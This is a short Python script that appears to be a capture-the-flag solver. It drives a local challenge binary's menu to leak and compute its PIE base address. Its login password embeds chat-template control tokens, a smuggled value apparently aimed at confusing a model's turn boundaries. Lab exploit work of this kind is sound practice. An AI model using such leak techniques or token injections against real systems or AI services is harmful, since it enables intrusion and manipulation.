#!/usr/bin/env python3
import subprocess
import struct
import re
import time

def solve_local():
    p = subprocess.Popen(
        ["./script/extracted/challenge"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        bufsize=0
    )

    def read_until(target):
        buf = b""
        while target not in buf:
            c = p.stdout.read(1)
            if not c:
                break
            buf += c
        return buf

    # 1. Login
    read_until(b"> ")
    p.stdin.write(b"1\n")
    read_until(b"Password: ")
    p.stdin.write(b"<|eot_id|><|im_end|>pwd=guest\n")

    out = read_until(b"> ")
    print("[+] Login response:", out.decode('utf-8', errors='replace'))

    # 2. Configure priority (Option 2)
    p.stdin.write(b"2\n")
    read_until(b"New priority (1-10): ")
    p.stdin.write(b"5\n")
    read_until(b"> ")

    # 3. Call support (Option 6) to leak PIE
    p.stdin.write(b"6\n")
    read_until(b"Enter Support ID (e.g., ID-1234): ")
    p.stdin.write(b"LEAK\n")
    resp = read_until(b"\n")
    print("[+] Support resp:", resp.decode('utf-8', errors='replace'))

    m = re.search(r"Ticket created for ID: (-?\d+)", resp.decode('utf-8', errors='replace'))
    if not m:
        print("[-] Failed to leak PIE")
        p.kill()
        return

    raw_val = int(m.group(1))
    if raw_val < 0:
        raw_val += (1 << 64)
    print(f"[+] Leaked raw value: {hex(raw_val)}")

    pie_base = raw_val - 0x5b4c
    print(f"[+] PIE Base: {hex(pie_base)}")
    assert pie_base & 0xfff == 0, "PIE base not page aligned!"
    print("[+] PIE successfully verified and aligned!")

    p.kill()

if __name__ == "__main__":
    solve_local()
